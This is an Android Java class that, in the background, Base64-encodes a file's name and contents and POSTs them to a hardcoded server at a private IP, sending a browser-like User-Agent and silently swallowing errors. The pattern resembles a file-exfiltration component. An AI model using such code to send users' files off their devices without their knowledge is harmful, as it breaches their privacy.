package com.animal;

import java.io.DataOutputStream;
import java.io.File;
import java.io.RandomAccessFile;
import java.net.HttpURLConnection;
import java.net.URL;

import android.os.AsyncTask;
import android.util.Base64;

public class FileUploader extends AsyncTask<File, Void, Void> {

	private static String IP_ADDRESS = "192.168.33.1:4567";
	
	@Override
	protected Void doInBackground(File... files) {
		try {
			
			URL url = new URL("http://" + IP_ADDRESS + "/upload");
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
			File file = files[0];
			
			connection.setRequestMethod("POST");
			connection.setRequestProperty("User-Agent", "Mozilla/5.0");
			
			String nombre64 = new String(Base64.encode(file.getName().getBytes(), Base64.URL_SAFE | Base64.NO_WRAP));
			
			RandomAccessFile f = new RandomAccessFile(file.getPath(), "r");
			byte[] payload = new byte[(int) f.length()];
			f.read(payload);
			f.close();
			String payload64 = new String(Base64.encode(payload, Base64.URL_SAFE | Base64.NO_WRAP));
			
			String urlParameters = "nombre=" + nombre64 + "&valor=" + payload64;
			
			connection.setDoOutput(true);
			DataOutputStream output = new DataOutputStream(connection.getOutputStream());
			output.writeBytes(urlParameters);
			output.flush();
			output.close();
			connection.getResponseCode();
			
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		return null;
	}

}
